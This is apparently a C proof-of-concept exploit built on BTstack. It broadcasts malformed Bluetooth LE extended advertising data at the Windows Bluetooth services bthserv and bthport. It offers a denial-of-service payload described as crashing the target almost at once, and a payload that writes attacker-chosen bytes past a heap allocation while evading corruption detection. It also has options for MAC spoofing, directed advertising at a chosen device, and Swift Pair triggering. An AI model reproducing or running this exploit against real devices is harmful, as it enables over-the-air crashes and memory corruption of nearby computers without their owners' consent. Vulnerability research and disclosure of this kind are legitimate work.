#include "btstack.h"

#include <stdio.h>

const static bd_addr_t null_bd_addr = { 0x00 };
static btstack_packet_callback_registration_t hci_event_callback_registration;

static uint8_t chosen_payload = 0;
static uint8_t chosen_target = 0;
static uint8_t chosen_msft = 0;
static uint8_t spoof_addr_mode = 0;
static bd_addr_t spoof_addr = { 0 };
static bd_addr_t direct_addr = { 0 };
static uint8_t user_data_bytes[254];
static uint8_t user_data_size = 0;

const static uint8_t msft_adv_section[] = { 0x04, 0xFF, 0x06, 0x00, 0x03 };
const static uint8_t invalid_adv_section[] = { 0x01, 0x13 };
 
const static uint8_t empty_adv_section_type = 0x00;
const static uint8_t custom_adv_section_type = 0x24;

#define MAX_ADV_DATA_SIZE 1650

uint16_t add_empty_section(uint8_t* dst_buf, uint8_t section_len)
{
    dst_buf[0] = section_len + 1;
    dst_buf[1] = empty_adv_section_type;
    memset(dst_buf + 2, 0, section_len);
    return section_len + 2u;
}

uint16_t add_custom_section(uint8_t* dst_buf, const uint8_t* section_data, uint8_t section_data_size)
{
    dst_buf[0] = section_data_size + 1;
    dst_buf[1] = custom_adv_section_type;
    memcpy(dst_buf + 2, section_data, section_data_size);
    return section_data_size + 2;
}

uint16_t add_invalid_section(uint8_t* dst_buf)
{
    memcpy(dst_buf, invalid_adv_section, sizeof(invalid_adv_section));
    return sizeof(invalid_adv_section);
}

uint16_t add_msft_section(uint8_t* dst_buf)
{
    memcpy(dst_buf, msft_adv_section, sizeof(msft_adv_section));
    return sizeof(msft_adv_section);
}

void get_dos_adv_data(uint8_t** out_adv_data, uint16_t* out_adv_data_size)
{
    static uint8_t adv_data[MAX_ADV_DATA_SIZE];

    hci_stack_t* hci_stack = hci_get_stack();
    const uint16_t num_empty_sections = 257;//(hci_stack->le_maximum_advertising_data_length / 512) * 256 + 1;
    
    uint16_t adv_data_size = 0;
    if (chosen_msft)
    {
        adv_data_size += add_msft_section(adv_data);
    }

    for (uint16_t i = 0; i < num_empty_sections; ++i)
    {
        adv_data_size += add_empty_section(adv_data + adv_data_size, 0);
    }

    *out_adv_data = adv_data;
    *out_adv_data_size = adv_data_size;
}

void get_user_adv_data(uint8_t** out_adv_data, uint16_t* out_adv_data_size)
{
    static uint8_t adv_data[MAX_ADV_DATA_SIZE];
    const static uint16_t num_empty_sections = 253;

    uint16_t adv_data_size = 0;
    uint8_t prefix_empty_sections = 1 + !chosen_msft;

    if (chosen_msft)
    {
        adv_data_size += add_msft_section(adv_data);
    }

    for (uint16_t i = 0; i < prefix_empty_sections; ++i)
    {
        adv_data_size += add_empty_section(adv_data + adv_data_size, 0);
    }

    uint16_t prefix_size = adv_data_size;
    uint16_t custom_size = add_custom_section(adv_data + adv_data_size, user_data_bytes, user_data_size);
    adv_data_size += custom_size;
    adv_data_size += add_invalid_section(adv_data + adv_data_size);

    for (uint16_t i = 0; i < num_empty_sections - 1; ++i)
    {
        adv_data_size += add_empty_section(adv_data + adv_data_size, 0);
    }

    uint8_t padding_size = prefix_size + custom_size - adv_data_size;
    adv_data_size += add_empty_section(adv_data + adv_data_size, padding_size);

    *out_adv_data = adv_data;
    *out_adv_data_size = adv_data_size;
}

static bool check_requirements(uint16_t advertisingDataLen)
{
    if (!hci_extended_advertising_supported())
    {
        printf("[Error] HCI Extended advertising is not supported. The PoC requires a controller which supports extended advertising.\n");
        return false;
    }

    hci_stack_t* hci_stack = hci_get_stack();
    if (hci_stack->le_maximum_advertising_data_length < advertisingDataLen)
    {
        printf("[Error] Maximum advertising data length is smaller than the length of the payload in the PoC. PoC Payload length: 0x%x, Maximum advertising data length: 0x%x.\n", advertisingDataLen, hci_stack->le_maximum_advertising_data_length);
        return false;
    }

    return true;
}

static void start_advertising_data(const uint8_t* adv_data, const uint16_t adv_data_size)
{
    static le_advertising_set_t le_advertising_set;
    static le_extended_advertising_parameters_t extended_params =
    {
        .advertising_event_properties = 0,
        .primary_advertising_interval_min = 250,
        .primary_advertising_interval_max = 250,
        .primary_advertising_channel_map = 7,
        .own_address_type = 0,
        .peer_address_type = 0,
        .peer_address = { 0 },
        .advertising_filter_policy = 0,
        .advertising_tx_power = 10, // 10 dBm
        .primary_advertising_phy = 1, // LE 1M PHY
        .secondary_advertising_max_skip = 0,
        .secondary_advertising_phy = 1, // LE 1M PHY
        .advertising_sid = 0,
        .scan_request_notification_enable = 1,
    };

    if (chosen_target == 2)
        extended_params.advertising_event_properties |= 2;  // scannable

    if (bd_addr_cmp(direct_addr, null_bd_addr))
    {
        extended_params.advertising_event_properties |= 0x04;  // directed
        bd_addr_copy(extended_params.peer_address, direct_addr);
    }

    if (bd_addr_cmp(spoof_addr, null_bd_addr))
    {
        extended_params.own_address_type = spoof_addr_mode;
    }

    static uint8_t adv_handle = 0;
    uint8_t error_code = ERROR_CODE_SUCCESS;

    error_code = gap_extended_advertising_setup(&le_advertising_set, &extended_params, &adv_handle);
    if (error_code != ERROR_CODE_SUCCESS)
    {
        printf("[Error] Extended advertising setup failed. Error code: 0x%08x\n", error_code);
        return;
    }

    if (chosen_target == 2)
    {
        error_code = gap_extended_advertising_set_scan_response_data(adv_handle, adv_data_size, adv_data);
        if (error_code != ERROR_CODE_SUCCESS)
        {
            printf("[Error] Unable to set extended advertising data. Error code: 0x%08x", error_code);
            return;
        }
    }
    else
    {
        error_code = gap_extended_advertising_set_adv_data(adv_handle, adv_data_size, adv_data);
        if (error_code != ERROR_CODE_SUCCESS)
        {
            printf("[Error] Unable to set extended advertising data. Error code: 0x%08x", error_code);
            return;
        }
    }

    error_code = gap_extended_advertising_start(adv_handle, 0, 0);
    if (error_code != ERROR_CODE_SUCCESS)
    {
        printf("[Error] Unable to start extended advertising. Error code: 0x%08x\n", error_code);
        return;
    }
}

static bool get_payload(uint8_t** out_payload_data, uint16_t* out_payload_data_size)
{
    switch (chosen_payload)
    {
    case 1:
        get_dos_adv_data(out_payload_data, out_payload_data_size);
        break;
    case 2:
        get_user_adv_data(out_payload_data, out_payload_data_size);
        break;
    default:
        return false;
    }

    return true;
}

void do_work()
{
    if (bd_addr_cmp(spoof_addr, null_bd_addr))
    {
        hci_le_set_own_address_type(spoof_addr_mode);
        hci_le_own_address_set(spoof_addr);
    }

    uint8_t* payload_data = NULL;
    uint16_t payload_data_size = 0;
    if (get_payload(&payload_data, &payload_data_size) && check_requirements(payload_data_size))
    {
        start_advertising_data(payload_data, payload_data_size);
    }
}

static void hci_event_handler(uint8_t packet_type, uint16_t channel, uint8_t* packet, uint16_t size) 
{
    UNUSED(channel);
    UNUSED(size);

    if (packet_type != HCI_EVENT_PACKET) return;

    uint8_t event = hci_event_packet_get_type(packet);

    switch (event) {
    case BTSTACK_EVENT_STATE:
    {
        if (btstack_event_state_get_state(packet) == HCI_STATE_WORKING)
        {
            do_work();
        }
        break;
    }
    case HCI_EVENT_COMMAND_COMPLETE:
    {
        const uint16_t opcode = hci_event_command_complete_get_command_opcode(packet);
        uint8_t error_code = hci_event_command_complete_get_return_parameters(packet)[0];
        const char* command_name = "";
        switch (opcode)
        {
        case HCI_OPCODE_HCI_LE_SET_EXTENDED_ADVERTISING_PARAMETERS:
            command_name = "Set Extended Advertising Parameters";
            break;
        case HCI_OPCODE_HCI_LE_SET_EXTENDED_ADVERTISING_DATA:
            command_name = "Set Extended Advertising Data";
            break;
        case HCI_OPCODE_HCI_LE_SET_EXTENDED_ADVERTISING_ENABLE:
            command_name = "Set Extended Advertising Enable";
            break;
        case HCI_OPCODE_HCI_LE_SET_RANDOM_ADDRESS:
            command_name = "Set Random Address";
            break;
        case HCI_OPCODE_HCI_LE_SET_EXTENDED_SCAN_RESPONSE_DATA:
            command_name = "Set Extended Scan Response Data";
            break;
        case 0xFC31:
            command_name = "Set Public Address (Intel)";
            break;
        default:
            return;
        }

        if (error_code != ERROR_CODE_SUCCESS)
        {
            printf("[Error] %s failed. Error code: 0x%08x\n", command_name, error_code);
        }
        else
        {
            printf("[Info] %s succeeded.\n", command_name);
        }
    }
    default:
        break;
    }
}

void print_usage()
{
    printf("Usage: poc.exe [options].\n");
    printf("\nOptions: \n");
    printf("-t [1-2] --> Module to target. 1 = bthserv | 2 = bthport.\n");
    printf("-a [xx:xx:xx:xx:xx:xx] --> Use directed advertising to the specified public MAC address.\n");
    printf("-d --> Deploy the DoS payload, which nearly guarantees an immediate crash on the target.\n");
    printf("-w [bytes] --> Deploy a payload which writes the provided bytes outside of the heap allocation at offset 0x155, avoiding immediate heap corruption detection. Bytes should be formated as a contiguous string of hexadecimal characters. E.g. 414141414141.\n");
	printf("-i [0-1] [xx:xx:xx:xx:xx:xx] --> Spoof the MAC address. First argument is type of the address (0 = public, 1 = random). Second argument is the MAC address.\n");
	printf("-m --> Include empty/malformed MSFT payload. Used to trigger Swift Pair detection on the target system..\n");
    return;
}

bool get_char_value(char c, uint8_t* out_value)
{
    if (c >= '0' && c <= '9') { *out_value = c - '0'; return true; }
    if (c >= 'A' && c <= 'F') { *out_value = c - 'A' + 10; return true; }
    if (c >= 'a' && c <= 'f') { *out_value = c - 'a' + 10; return true; }
    return false;
}

bool parse_user_data(const char* data)
{
    int len = (int)strlen(data);
    for (int i = 0; i < len; i += 2)
    {
        if (i == sizeof(user_data_bytes) * 2)
        {
            printf("Bytes data too long, truncating to 255 bytes.\n");
            return true;
        }

        uint8_t val1, val2;
        if (get_char_value(data[i], &val1) && get_char_value(data[i + 1], &val2))
        {
            uint8_t byte_value = val1 * 16 + val2;
            user_data_bytes[i / 2] = byte_value;
            ++user_data_size;
        }
        else
        {
            return false;
        }
    }

    return true;
}

int parse_option(const char* option_str, const char** next_options)
{
    if (option_str[0] != '-')
    {
        print_usage();
        return -1;
    }
	
	char option = option_str[1];
    const char* next_option_str = next_options[0];
    const char* sc_option_str = next_options[1];
    if (option == 't')
    {
        if (next_option_str == NULL)
        {
            printf("Missing argument for option -t.\n");
            return -1;
        }
        else
        {
            chosen_target = atoi(next_option_str);
            if (chosen_target < 1 || chosen_target > 2)
            {
                printf("Wrong argument for option -t. Needs to be 1-2.\n");
                return -1;
            }
        }

        return 2;
    }
    else if (option == 'i')
    {
        if (next_option_str == NULL || sc_option_str == NULL)
        {
            printf("Missing argument(s) for option -i.\n");
            return -1;
        }
        else
        {
            spoof_addr_mode = atoi(next_option_str);
            if (spoof_addr_mode > 1)
            {
                printf("Wrong address mode argument for option -i. Needs to be 0-1.\n");
                return -1;
            }

            if (sscanf_bd_addr(sc_option_str, spoof_addr) != 1)
            {
                printf("Wrong address argument for option -i. Use xx:xx:xx:xx:xx:xx to specify the address.\n");
                return -1;
            }
        }

        return 3;
    }
    else if (option == 'm')
    {
        chosen_msft = true;
        return 1;
    }
    else if (option == 'a')
    {
        if (sscanf_bd_addr(next_option_str, direct_addr) != 1)
        {
            printf("Wrong address argument for option -a. Use xx:xx:xx:xx:xx:xx to specify the address.\n");
            return -1;
        }
        return 2;
    }
	else if (option == 'd')
    {
		if (chosen_payload != 0)
		{
            printf("-w and -d cannot be used together.\n");
			return -1;
		}
		
        chosen_payload = 1;
		return 1;
    }
    else if (option == 'w')
    {
		if (chosen_payload != 0)
		{
            printf("-w and -d cannot be used together.\n");
			return -1;
		}
		
        chosen_payload = 2;
        if (next_option_str == NULL)
        {
            printf("Missing data argument for option -w.\n");
            return -1;
        }

        if (!parse_user_data(next_option_str))
        {
            printf("Unable to parse provided data as bytes for option -w.\n");
            return -1;
        }
		
		return 2;
    }
    else
    {
        printf("Unknown option: %c\n", option);
        return -1;
    }
}

int btstack_verifycmd(int argc, const char* argv[])
{
    if (argc < 3)
    {
        print_usage();
        return -1;
    }

    for (int i = 1; i < argc; )
    {
        int po = parse_option(argv[i], argv + i + 1);
        if (po == -1)
        {
            return -1;
        }
        i += po;
    }

    if (chosen_payload == 0)
    {
        printf("You must choose either -w or -d.\n");
        return -1;
    }

    if (chosen_target == 0)
    {
        printf("You must specify the target by using -t.\n");
        return -1;
    }

    return 0;
}

int btstack_main(int argc, const char* argv[])
{
    printf("\n[Info] Running the PoC with following parameters: \n");
    printf("[Info] Target = %s\n", chosen_target == 1 ? "bthserv" : "bthport");
    printf("[Info] Payload = %s\n", chosen_payload == 1 ? "DoS" : "Custom data");
    if (bd_addr_cmp(direct_addr, null_bd_addr))
        printf("[Info] Directed advertising = Enabled. Address: %s\n", bd_addr_to_str(direct_addr));
    else
        printf("[Info] Directed advertising = Disabled\n");
    if (bd_addr_cmp(spoof_addr, null_bd_addr))
        printf("[Info] Spoofing address: Type = %s, Address = %s\n", spoof_addr_mode == 1 ? "Random" : "Public", bd_addr_to_str(spoof_addr));
    if (chosen_msft)
        printf("[Info] MSFT Payload: Included.\n");
    printf("\n");

	hci_event_callback_registration.callback = &hci_event_handler;
	hci_add_event_handler(&hci_event_callback_registration);
	hci_power_control(HCI_POWER_ON);

	return 0;
}